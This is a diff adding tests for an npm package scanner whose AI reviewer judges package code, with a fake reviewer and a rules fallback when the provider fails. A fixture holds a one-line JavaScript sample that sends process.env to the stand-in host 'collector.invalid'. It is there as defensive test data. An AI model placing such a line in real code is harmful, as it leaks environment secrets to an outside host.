@@ -5,9 +5,11 @@ from datetime import UTC, datetime
 import httpx
 from helpers import make_packument, make_tgz, manifest_json
 
+from pkgguard_analyzer.ai.config import AIMode
+from pkgguard_analyzer.ai.reviewer import ReviewerOutput
 from pkgguard_analyzer.analyze import analyze, parse_spec
 from pkgguard_analyzer.intel import OSV_QUERY_URL, SAFEDEP_QUERY_URL
-from pkgguard_analyzer.schema import ScanStatus, Verdict
+from pkgguard_analyzer.schema import AIVerdict, DecidedBy, ReviewMode, ScanStatus, Verdict
 
 NOW = datetime(2026, 9, 17, tzinfo=UTC)
 TARBALL_URL = "https://registry.npmjs.org/demo-pkg/-/demo-pkg-1.0.0.tgz"
@@ -95,3 +97,58 @@ def test_suspicious_code_changes_verdict(tmp_path):
     assert result.record.verdict == Verdict.SUSPICIOUS
     assert any(f.rule_id == "code.exfiltration" for f in result.report.findings)
     assert result.report.code_scan["filesScanned"] == 1
+
+
+class FakeReviewer:
+    model_id = "fake-model"
+
+    def __init__(self, verdict="SAFE", confidence="HIGH", error=None):
+        self.output = AIVerdict(verdict=verdict, confidence=confidence, summary=f"AI says {verdict}", reasoning="read the code")
+        self.error = error
+        self.modes = []
+
+    def review(self, workspace, task, mode):
+        self.modes.append(mode)
+        if self.error:
+            raise self.error
+        workspace.read_file("index.js")
+        return ReviewerOutput(self.output, 100, 20)
+
+
+EXFIL_CODE = 'const h = require("https"); h.request({host: "collector.invalid"}).end(JSON.stringify(process.env));'
+
+
+def test_ai_quick_look_runs_on_clean_package(tmp_path):
+    tarball = make_tgz({"package/package.json": manifest_json(), "package/index.js": "module.exports = 1"})
+    reviewer = FakeReviewer("SAFE", "HIGH")
+    result = analyze("demo-pkg", out_dir=tmp_path, client=mock_client(tarball, sri(tarball)), now=NOW, reviewer=reviewer, ai_mode=AIMode.ALWAYS)
+    assert reviewer.modes == [ReviewMode.QUICK_LOOK]
+    assert result.record.decided_by == DecidedBy.AI
+    assert result.record.model == "fake-model"
+    assert result.report.ai_review.files_read == ["index.js"]
+
+
+def test_flagged_mode_skips_clean_package(tmp_path):
+    tarball = make_tgz({"package/package.json": manifest_json(), "package/index.js": "module.exports = 1"})
+    reviewer = FakeReviewer()
+    result = analyze("demo-pkg", out_dir=tmp_path, client=mock_client(tarball, sri(tarball)), now=NOW, reviewer=reviewer, ai_mode=AIMode.FLAGGED)
+    assert reviewer.modes == []
+    assert result.report.ai_review is None and result.record.model is None
+
+
+def test_ai_confirms_malware(tmp_path):
+    tarball = make_tgz({"package/package.json": manifest_json(), "package/index.js": EXFIL_CODE})
+    reviewer = FakeReviewer("MALICIOUS", "HIGH")
+    result = analyze("demo-pkg", out_dir=tmp_path, client=mock_client(tarball, sri(tarball)), now=NOW, reviewer=reviewer, ai_mode=AIMode.ALWAYS)
+    assert reviewer.modes == [ReviewMode.DEEP_DIVE]
+    assert (result.record.verdict, result.record.decided_by) == (Verdict.MALICIOUS, DecidedBy.AI)
+
+
+def test_ai_failure_falls_back_to_rules(tmp_path):
+    tarball = make_tgz({"package/package.json": manifest_json(), "package/index.js": EXFIL_CODE})
+    reviewer = FakeReviewer(error=ConnectionError("provider down"))
+    result = analyze("demo-pkg", out_dir=tmp_path, client=mock_client(tarball, sri(tarball)), now=NOW, reviewer=reviewer, ai_mode=AIMode.ALWAYS)
+    assert result.record.status == ScanStatus.COMPLETE
+    assert result.record.verdict == Verdict.SUSPICIOUS
+    assert result.record.ai_failed is True
+    assert "provider down" in result.report.ai_error
